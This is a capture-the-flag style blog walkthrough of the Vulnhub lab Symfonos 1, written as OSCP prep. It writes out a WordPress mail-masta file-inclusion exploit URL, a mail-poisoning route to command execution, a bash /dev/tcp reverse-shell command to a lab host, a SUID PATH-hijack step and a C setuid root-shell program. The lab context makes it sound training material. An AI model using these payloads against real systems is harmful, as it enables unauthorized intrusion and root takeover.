+++
title = "Vulnhub: Symfonos 1"
date = "2021-01-22"
author = ""
tags = ["Beginner", "Vulnhub", "OSCP Prep", "Wordpress", "LFI", "SUID"]
keywords = ["", ""]
description = ""
showFullContent = false
cover = "/img/symfonos1/symfonos1.png"
images = ["/img/symfonos1/symfonos1.png"]
+++



| Difficulty | Release Date | Author | 
| ---------- | ------------ | ------ | 
| Beginner   | 29 June 2019   | Zayotic | 

# Summary 

I got an OSCP voucher last year and this is my active effort to prep for it using TJ-Null's OSCP 
Prep list. Hopefully documenting this will help improve my methodology and get me ready for OSCP and beyond.

In this box, initial access is through lfi to rce by using sending a payload in mail and accessing it.For privilege 
escalation we exploit a setuid binary that doesn't use absolute paths, therefore hijacking the path gives us root.

# Reconnaissance
I already have the IP of the box.

Nmap output:

```
Nmap scan report for 192.168.191.128
Host is up (0.00025s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2021-01-21T13:48:08-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-01-21T19:48:08
|_  start_date: N/A
```

# Enumeration

## Samba (139/445)

Using enum4linux-ng we get 2 pieces of useful information.

```sh
enum4linux-ng.py -A 192.168.191.128:

```
A user **helios** is discovered

{{< image src="/img/symfonos1/symfonos2.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

and the **anonymous** share is accessible without credentials.

{{< image src="/img/symfonos1/symfonos3.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

Using smbclient to access the share, there is a txt file.

```sh
smbclient \\\\192.168.191.128\\anonymous -N
```

{{< image src="/img/symfonos1/symfonos4.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

Looking at the contents of attention.txt:

{{< image src="/img/symfonos1/symfonos5.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

Now we have a username and possible passwords. The combination **helios:qwerty** works and we can access
the helios share.

We get access to more txt files, but only the todo.txt has valuable information. 

{{< image src="/img/symfonos1/symfonos6.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

It gives an endpoint,that we can access on the webserver.

{{< image src="/img/symfonos1/symfonos7.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

## HTTP (80)
When we access the endpoint we end up on a wordpress instance. 

{{< image src="/img/symfonos1/symfonos8.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

After enumeration using wpscan, 2 plugins are discovered to be vulnerable to unauthenticated LFI.

```sh
wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token [redacted]
```

1. mail-masta 1.0:

{{< image src="/img/symfonos1/symfonos9.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

2. site-editor 1.1.1

{{< image src="/img/symfonos1/symfonos10.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

Using the PoC available on exploitdb: https://www.exploit-db.com/exploits/40290/ , we can craft this url
to read files such as /etc/passwd:

```sh
curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

{{< image src="/img/symfonos1/symfonos11.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

# Getting shell as helios - LFI to RCE

A typical method to escalate to RCE using LFI is poisoning log files but I wasn't able to load any log
file to use this method. 
With the presence of port 25 we can try sending an email and try accessing the email using LFI.

Sending email with payload:

{{< image src="/img/symfonos1/symfonos12.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

Visiting the mails for user helios in /var/mail/helios gives access to the poisoned file and we can run commands.

```url
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami
```

{{< image src="/img/symfonos1/symfonos13.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

Now we can get a reverse shell using this payload: 

```sh
/bin/bash -c "/bin/bash -i >%26 /dev/tcp/192.168.191.1/9000 0>%261 %26"
```

# Privilege Escalation

Usual enumeration for privilege escalation involves looking for suid binaries by using find.

```sh
find / -perm -4000 2>/dev/null
```

The binary statuscheck isn't among the linux default ones.

{{< image src="/img/symfonos1/symfonos14.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

After running it and then running strings against it, it calls the curl command when executed.

{{< image src="/img/symfonos1/symfonos15.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

Since it doesn't use the absolute path we can abuse this by setting our own PATH and make it call our own custom
curl command.

In my custom curl script I get a copy of bash and give it suid permissions:

{{< image src="/img/symfonos1/symfonos16.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

### Rooted

{{< image src="/img/symfonos1/symfonos17.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

# Extras

Better way to handle the sending email part using sendEmail:

```sh
sendEmail -t root@symfonos.localdomain -f test@sendEmailtest.com -s 192.168.191.128:25 -u "Test Subject" -m "Test Message" -o tls=no
```

Better suid exploit, compiling a c program that correctly sets the uid and gid as root.

```c
#include<unistd.h>
void main(){
    setgid(0); 
    setuid(0);
    execl("/bin/bash","/bin/bash",0);
}
```
Reason why sending mails addressed to other users drops all the mails to helios is because of aliases set in postfix: /etc/postfix/main.cf

{{< image src="/img/symfonos1/symfonos18.png" alt="symfonos1" position="center" style="border-radius: 8px;" >}}

You can reach/follow me on Twitter if you have some feedback or questions.

Twitter: [ikuamike](https://twitter.com/ikuamike)

Github: [ikuamike](https://github.com/ikuamike)
